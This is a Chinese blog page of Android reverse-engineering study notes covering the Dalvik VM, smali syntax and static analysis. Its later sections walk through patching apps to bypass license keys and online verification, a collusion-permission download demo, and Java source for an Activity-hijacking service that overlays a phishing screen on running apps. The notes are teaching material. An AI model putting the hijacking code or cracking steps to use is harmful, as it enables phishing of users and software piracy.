@@ -1,0 +1,2100 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "360cefba"
+    });
+  daovoice('update');
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.4.1',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="android逆向分析-i春秋  基础  bitxiongxi@qq.com  //note01  一.Dalvik虚拟机 二.静态分析 三.静态分析应用：应用破解与系统攻击">
+<meta name="keywords" content="笔记,编程,Android,逆向">
+<meta property="og:type" content="article">
+<meta property="og:title" content="android逆向学习笔记01">
+<meta property="og:url" content="prayer007007.github.io/2018/09/10/android逆向学习笔记01/index.html">
+<meta property="og:site_name" content="Demo`s Blog">
+<meta property="og:description" content="android逆向分析-i春秋  基础  bitxiongxi@qq.com  //note01  一.Dalvik虚拟机 二.静态分析 三.静态分析应用：应用破解与系统攻击">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-09-09T11:19:24.635Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="android逆向学习笔记01">
+<meta name="twitter:description" content="android逆向分析-i春秋  基础  bitxiongxi@qq.com  //note01  一.Dalvik虚拟机 二.静态分析 三.静态分析应用：应用破解与系统攻击">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demo`s Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="prayer007007.github.io/2018/09/10/android逆向学习笔记01/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>android逆向学习笔记01 | Demo`s Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/prayer007007"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png" alt="Fork me on GitHub"></a>
+    <a href="https://github.com/prayer007007" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Demo`s Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">one world one dream</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="prayer007007.github.io/2018/09/10/android逆向学习笔记01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Demo-Mr Wang">
+      <meta itemprop="description" content="Technical exchange">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Demo`s Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">android逆向学习笔记01
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-09-09 19:18:15 / 修改时间：11:19:24" itemprop="dateCreated datePublished" datetime="2018-09-09T19:18:15Z">2018-09-09</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技能/" itemprop="url" rel="index"><span itemprop="name">技能</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技能/编程/" itemprop="url" rel="index"><span itemprop="name">编程</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技能/编程/后端/" itemprop="url" rel="index"><span itemprop="name">后端</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技能/编程/后端/逆向/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技能/编程/后端/逆向/Android/" itemprop="url" rel="index"><span itemprop="name">Android</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技能/编程/后端/逆向/Android/基础/" itemprop="url" rel="index"><span itemprop="name">基础</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技能/编程/后端/逆向/Android/基础/笔记/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">13k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">12 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <pre><code>android逆向分析-i春秋
+
+基础
+
+bitxiongxi@qq.com
+
+//note01
+
+一.Dalvik虚拟机
+二.静态分析
+三.静态分析应用：应用破解与系统攻击
+</code></pre><a id="more"></a>    
+<pre><code>《Android软件安全与逆向分析》丰生强著
+
+android系统架构：
+linux内核： （软件与硬件之间的一层，提供驱动）
+    Display Driver
+    Camera Driver
+    Flash Memory Driver
+    Binder(IPC) Driver
+    Keypad Driver
+    WiFi Driver
+    Audio Driver
+    Power Management
+    ....
+Libraries（系统库）(C/C++写的)
+    Surface Manager
+    Media Framework
+    SQLite
+    OpenGL | ES
+    FreeType
+    WebKit
+    SGL
+    SSL
+    libc
+(重点)Andrioid Runtime 
+    Core Libraries（支持java语言的jar包）
+    Dalvik Virtual Machine （Dalvik虚拟机，类似jvm）
+        （每启动一个程序的时候，都会创建一个Dalvik实例）
+Application Framework（应用程序框架，一堆API）(正向开发)
+    Activity Manager
+    Window Manager
+    Content Providers
+    View System
+    Package Manager
+    Telephony Manager
+    Resource Manager
+    Location Manager
+    Notification Manager
+Applications
+    Home
+    Contacts
+    Phone
+    Browser
+    ...
+
+Android基础，java基础，信息安全基础
+
+//note02  Dalvik虚拟机（DVM）
+
+DVM和JVM的区别：
+    ·JVM运行的是Java字节吗，DVM运行的是Dalvik字节码
+    ·Dalvik可执行文件（.dex）体积更小
+    ·虚拟机架构不同：JVM基于栈，DVM基于寄存器（用来暂时存储运算的中间器）
+reg：
+Java代码：
+public class Hello{
+    public int foo(int a,int b){
+        return (a+b)*(a-b);
+    }
+    main(){
+        Hello hello =new Hello();
+        sout(hello.foo(5,3));
+    }
+}
+(仅针对foo这个函数)
+Java字节码：
+public int foo(int,int);
+ Code:
+ 0:    iload_1     (i:int;load:将变量的值压到栈上；把第一个值压到栈上)
+ 1:    iload_2
+ 2: iadd        (栈上的1，2两个值相加,把结果再压出栈)
+ 3: iload_1
+ 4: iload_2
+ 5: isub         （相减，压出栈）
+ 6: imul        （相乘，相乘）
+ 7: ireturn        （返回）
+
+ Dalvik字节码：
+ Hello.foo:(II)I     （函数的定义，II：两个参数都是int类型，I：返回值也是int类型）
+ 0000: add-int v0,v3,v4     （v3和v4的值相加，再将值存到v0里面）
+ 0002: sub-int v1,v3,v4     （相减，存到v1里面）
+ 0004: mul-int/2addr v0,v1    （乘法，然后存到v0里面）
+ 0005: return v0             （返回v0）
+
+ Dalvik汇编语言简介：
+ v命名法和p命名法 （通常使用的是p命名法）
+ v命名法     p命名法         寄存器含义
+ v0            v0             第1个局部变量寄存器
+ v1         v1             第2个局部变量寄存器
+ ...         ...         中间的局部变量寄存器
+ vM-N         p0             第1个参数寄存器（通常为调用对象）
+ ...         ...         中间的参数寄存器
+ vM-1         pN-1         第N个参数寄存器
+
+reg：
+3个局部变量和4个函数参数(包括一个this)
+v0,v1,v2     p0(this),p1,p2,p3
+
+
+类型描述符：
+V         void
+Z         boolean
+B         byte
+S         short
+C         char
+I         int
+J         long
+F         float
+D         double
+L         java类
+[         数组
+
+寄存器
+·DVM寄存器都是32bit的，与名称无关
+·J，D类型，需要相邻2个寄存器
+·对象类型：Ljava/lang/String；=java.lang.String
+·数组：[I=int[].[[I=int[][]
+
+方法：
+·格式：Lpackage/name/ObjectName（类名）;-&gt;MethodName(III)Z (III:3个int参数，返回boolean参数)
+·例子：
+    method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String
+    等价于
+    String method(int,int[][],int,String,Object[])
+字段：
+    格式：Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String
+
+程序编译与反编译
+
+class-&gt;dx-&gt;（dex文件；apk包，资源文件，androidManifest.xml）-&gt;baksmali-&gt;smali文件
+           dex就可以运行了
+                 baksmali反编译工具
+
+apk类似打包程序-&gt;解压
+androidManifest.xml 配置文件
+
+
+主要的反编译器：
+·BakSmali（主要用这个）
+·Dedexer
+
+
+Dalvik指令集
+空操作指令：nop
+数据操作指令：move
+    move vA,vB
+    将vB寄存器的值赋给vA寄存器，源寄存器与目的寄存器都为4位
+    move-&gt;object/from 16 vAA,vBBBB
+    为对象赋值。源寄存器为8位，目的寄存器为16位
+
+HelloWorld.smali
+.class public LHelloWorld;
+.super Ljava/lang/Object;
+.method public static main([Ljava/lang/String;)V (V:void)
+    .registers 4  (表示4个寄存器)
+    .parameter      (参数是空)
+    .prologue     (函数实际执行内容)
+    #空指令
+    nop
+    nop
+    nop
+    nop
+    #数据定义指令
+    const/16 v0,0x8     (把8放到v0里面)
+    const/4 v1,0x5
+    const/4 v2,0x3
+    #数据操作指令
+    move v1, v2     （将v2值放到v1里面）
+    #数组操作指令
+    new-array v0, v0, [I     （创建一个数组，大小是第二个v0，类型是int数组，放入第一个v0里）
+    array-length v1, v0     （将v0的长度放入v1）
+    #实例操作指令
+    new-instance v1, Ljava/lang/StringBuilder; 
+    #方法调用指令
+    invoke-direct {v1},Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V
+    #跳转指令
+    if-nez v0, :cond_0     (nez:not equals zero;如果不为0，则跳到cond_0) 
+    goto : goto_0     (如果为0，则跳到goto_0) 
+    :cond_0
+    #数据转换指令
+    int-to-float v2, v2
+    #数据运算指令
+    add-float v2, v2, v2
+    #比较指令
+    cmpl-float v0, v2, v2     (v2和v2比较的结果如果想等则返回0)
+    #字段操作指令
+    sget-object v0, Ljava/lang/System:-&gt;out:Ljava/io/PrintStream;
+        (获取System里面的out变量放入v0)
+    const-string v1, &quot;hello world&quot; #构造字符串 （定义一个字符串放入v1）
+    #方法调用指令
+    invoke-virtual {v0,v1},Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V
+    #返回指令
+    :goto_0
+    return-void
+.end method
+
+工具
+    ApkIDE（apk改之理）
+    ApkToolkit
+    jd-gui.exe
+
+Dalvik版的Hello World
+·编译smali文件
+    java -jar smali.jar -o classes.dex HelloWorld.smali
+        (-o:输出到classes.dex)
+·执行程序
+    上传到手机：adb push classes.dex /data/local/
+    执行程序：adb shell dalvikvm -cp /data/local/classes.dex HelloWorld
+
+ApkToolkit
+    将classes.dex-&gt;classes_dex.jar
+jd-gui.exe
+    查看jar文件
+
+
+//note03 静态分析
+·定义：
+    不运行代码的情况下（相对的），阅读反汇编代码来掌握程序功能的一种技术
+·两种方法：
+    1.阅读Dalvik字节码（通过baksmali反编译dex文件生成smali文件）
+    2.阅读java代码（通过dex2jar生成jar文件，再jd-gui阅读jar文件）
+
+
+定位关键代码
+常用步骤
+1.反编译apk (一般反编译成smali)
+2.通过AndroidManifest.xml查找主Activity
+&lt;activity android:label=&quot;@string/title_activity_main&quot; android:name=&quot;.MainActivity&quot;&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; #MAIN :主Activity
+        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; #LAUNCHER :通过该Activity启动,即首先进入的activity
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;
+3.查看程序的入口函数：主Activity的OnCreate()
+4.查看Application类（全局，早于其他类启动）的OnCreate()函数。该函数通常用作授权检测
+
+//.MainActivity 类名 title_activity_main 标题
+
+定位关键代码：
+常用方法：
+·信息反馈法：运行时信息
+·特征函数法：运行时行为
+·顺序查看法：执行流程
+·代码注入法：添加Log
+
+reg
+smali文件格式：
+.class public Lcom/droider/crackme0502/MainActivity;
+.super Landroid/app/Activity
+.source &quot;mainActivity.java&quot;
+
+# instance fields
+.field private btnAnno:Landroid/widget/Button;
+.field private btnCheckSN:Landroid/widget/Button;
+.field private edtSN:Landroid/widget/EditText;
+
+# direct methods （直接方法）
+.method public constructor&lt;init&gt;()V (构造函数)
+    .locals 0     （局部变量0个）
+
+    .prologue
+    .line 19
+    invokde-direct {p0},Landroid/app/Activity;-&gt;&lt;init&gt;()V     （p0：当前这个对象this)
+
+    return-void
+.end method
+
+内部类的表示
+·MainActivity$1.smali:匿名内部类，多用于程序中的响应
+·MainActivity$SNChecker.smali:成员内部类
+·MainActivity.smali:外部类
+
+·this$0是内部类自动保留的一个指向所在外部类的引用。this表示父类的引用，右边的0便是引用的层数
+·例：
+    public class Outer{         //this$0
+        public class FirstInner{         //this$1
+            pulblic class SecondInner{         //this$2
+                public class ThirdInner{}
+            }
+        }
+    }
+·this$X型字段都被指定了synthetic(合成)属性，表明他们是被编译器合成的，虚构的，非java代码指定的字段
+
+内部类的表示：
+构造函数执行步骤：
+1.保存外部类的引用到本类的一个synthetic字段中
+2.调用内部类的父类的构造函数
+3.内部类自身初始化
+
+reg：内部类，构造函数
+.class public Lcom/droider/crackme0502/MainActivity$SNChecker;(成员内部类)
+.super Ljava/lang/Object
+.source &quot;mainActivity.java&quot;
+
+# instance fields
+.field private sn:Ljava/lang/String;（sn:一般指验证码）
+.field final synthetic this$0:Lcom/droider/crackme0502/MainActivity;
+
+#direct methods
+.method public constructor&lt;init&gt;(Lcom/droider/crackme0502/MainActivity;Ljava/lang/String;)V
+    .locals 0
+    .param p2, &quot;sn&quot;     # Ljava/lang/String;
+    .prologue
+    .line 83
+    #将外部类引用赋给p1
+    iput-object p1,p0, Lcom/droider/crackme0502/MainActivity$SNChecker;-&gt;this$0:Lcom/droider/crackme0502/MainActivity;
+    #调用SNCheck的基类Object的构造函数
+    invoke-direct{p0},Ljava/lang/object;-&gt;&lt;init&gt;()V
+    .line 84
+    #调用SNCheck自身的构造函数
+    iput-object p2,p0 Lcom/droider/crackme0502/MainActivity$SNChecker;-&gt;sn:Ljava/lang/String;
+    .line 85
+    return-void
+.end method
+
+
+//note04     应用破解
+
+·试用版软件
+·网络验证
+
+安卓模拟器：
+    Eclipse自带有
+    BlueStatcks
+
+将apk拖入BlueStatcks
+将apk拖入ApkIDE
+    crypt.smali (加密解密)
+    R.smali（资源文件）
+
+MainActivity.smali
+    onCreate(){}
+        .locals 4
+        .param p1,&quot;xxx&quot;
+        ...
+        checkappKey()Z
+        move-result v2 (将结果保存到v2里面)
+        if-nez v2, :cond_2
+        ...
+        :cond_2
+        const v2, 0x7f03001 (是一个资源编号) (右边有搜索,将编号放入可以搜一下)
+        getAppKey()
+        decryptAppkey()     (解密函数)
+        这里会有一个跳转
+        if-ne v0,v2 :cond_3     (如果密钥匹配，就跳到cond_3)
+        在未授权的时候直接强行将其置成专业版的key值
+    保存-&gt;编译-&gt;生成xxx.apk
+
+网络验证例子：
+    使用前会先去网络验证是否是正版，如果不通过可能不会让使用
+    想断网的时候验证能不能通过：
+    360-&gt;演示-&gt;手机操作
+apkIDE-&gt;apk拖入
+    onClick():
+    getData()
+    new-instance: v1, Ljava/lang/Thread;
+    可以直接删掉cond_0 ,return-void
+编译-&gt;保存
+
+
+//note05     系统攻击
+
+·手机ROOT及其危害
+·串谋权限攻击
+·组件安全
+
+什么是ROOT？
+    在手机使用过程中获取操作系统root权限，即最高管理员权限
+
+手机root及其危害
+    root的危害
+        ·系统不稳定
+        ·病毒入侵
+        ·隐私数据暴露
+
+权限攻击
+串谋权限攻击
+    （联网下载文件并保存到SD卡上）
+    程序1的组件2不允许
+    程序2的组件1允许
+    程序1的组件2在没有权限的情况下，通过程序2的组件1联网并保存数据到SD卡
+
+reg：
+Download.apk (有权限)
+EvilDownload.apk(没有权限)
+
+在Download.apk最小化的时候，点开EvilDownload就实现了串谋攻击，就可以下载东西了
+
+&lt;uses-permission android:name=&quot;android.permission.WRITE_EXERNAL_STORAGE&quot; /&gt; (写入外置SD卡权限)
+&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; （访问网络的权限）
+没有这两个的话是没有相应权限的
+
+MainActivity():
+public void onCreate(Bundle savedInstanceState){
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+    setTitle(&quot;串谋攻击演示程序&quot;);
+    btn1 = (Button)findViewById(R.id.button1);
+    btn1.setOnClickListener(new OnClickListener(){
+        public void onClick(View v){
+            Intent intent = new Intent();     //创建Intent对象
+            intent.setAction(&quot;com.droider.download&quot;);
+            intent.putExtra(&quot;url&quot;,&quot;http://114.215.197.165/Struts2Login/    info.txt&quot;); //要下载的文件URL
+            String fileName = &quot;info.txt&quot;;     //保存的文件名
+            intent.putExtra(&quot;filename&quot;,filename);
+            sendBroadcast(intent); //发送广播
+        }
+    }
+});
+
+public class DownloadManager extends BroadcastReceiver{
+    @Override
+    public void onReceive(Context context,Intent intent){
+        if(intent.getAction().equals(&quot;com.droider.download&quot;)){
+            String url = intent.getExtras().getString(&quot;url&quot;);
+            String fileName = intent.getExtras().getString(&quot;filename&quot;);
+            Toast.makeText(context,url,Toast.LENGTH_SHORT).show();
+            MyAsyncTask task = new MyAsyncTask();
+            task.execute(url,fileName);
+        }
+    }
+}
+
+
+Activity劫持
+步骤：
+1.遍历运行中的程序
+2.恶意程序启动带FLAG_ACTIVITY_NEW_TASK标志的钓鱼式Activity覆盖正常的Activity
+3.用户在伪造的界面上进行操作
+4.恶意程序将信息发送到指定的网址
+5.切换到原来的Activity
+
+public class Hijacker extends Service{
+    private boolean started = false;
+    private List&lt;String&gt; mhijackingList;     //劫持的进程列表
+    private Timer mTimer = new Timer();
+    private TimerTask mTask = new TimerTask(){
+        @Override
+        public void run(){
+            Log.d(&quot;com.droider.hijacker&quot;,&quot;timertask start...&quot;);
+            ActivityManager am = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE;
+            started = true;
+            List&lt;RunningAppProcessInfo&gt; infos = am.getRunningAppProcesses();//枚举正在运行的进程列表
+            for(RunningAppProcessInfo psinfo: infos){
+                if(psinfo.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND)//前台进程
+                    if(mhijackingList.contains(psinfo.processName)){
+                        Log.d(&quot;com.droider.hijacker&quot;,&quot;hijacking start...&quot;);
+                        Intent intent = new Intent(getBaseContext(),HijackActivity.class);
+                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        intent.putExtra(&quot;processname&quot;,psinfo.processName);
+                        getApplication().startActivity(intent);//启动伪造的Activity
+                    }
+            }
+        }
+    }
+
+    @Override
+    public int onStartCommand(Intent intent,int flags,int startId){
+        Log.d(&quot;com.droider.jijacker&quot;,&quot;service start..&quot;);
+        mhijackingList = ((MyApp)getApplication()).hijackingList;
+        if(!started)
+            mTimer.scheduleAtFixedRate(mTask,2000,1500);//定时检查启动的进程列表中是否有被劫持的程序
+        return super.onStartCommand(intent,flags,startId);
+    }
+}
+
+public class MyApp extends Application{
+    List&lt;String&gt; hijackingList;
+    @Override
+    public void onCreate(){
+        hijackingList = new ArrayList&lt;String&gt;();
+        hijackingList.add(&quot;com.android.music&quot;);
+        hijackingList.add(&quot;com.android.browser&quot;);//要劫持的进程
+        super.onCreate();
+    }
+}
+
+public class HijackActivity extends Activity{
+    private TextView tv;
+    @Override
+    public void onCreate(Bundle savedInstanceState){
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_hijack);
+        setTitle(&quot;Activity劫持页面&quot;)；
+        tv=(TextView)findViewById(R.id.tv_process);
+        tv.setTextColor(Color.RED);
+        tv.setText(&quot;被劫持的进程：&quot;);
+        Bundle bundle = getIntent().getExtras();
+        if(bundle != null){
+            if(bundle.containsKey(&quot;processname&quot;)){
+                String str = bundle.getString(&quot;processname&quot;);
+                tv.setText(&quot;被劫持的进程：&quot;+str);
+            }
+        }
+    }
+    @Override
+    public boolean onTouchEvent(MotionEvent event){
+        Intent intent = new Intent(HijackActivity.this,Hijacker.class);
+        stopService(intent);    //停止劫持服务
+        moveTaskToBack(true);
+        return super.onTouchEvent(event);
+    }
+}
+
+//可以让程序不在最近访问的程序列表里面
+
+特点：不需要声明任何权限，一般杀毒软件无法检测
+</code></pre>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+        
+            <div>
+
+    <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>期待您的评论-------------</div>
+
+</div>
+
+        
+    </div>
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Demo-Mr Wang</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="prayer007007.github.io/2018/09/10/android逆向学习笔记01/" title="android逆向学习笔记01">prayer007007.github.io/2018/09/10/android逆向学习笔记01/</a>
+  </li>
+  <li class="post-copyright-license">
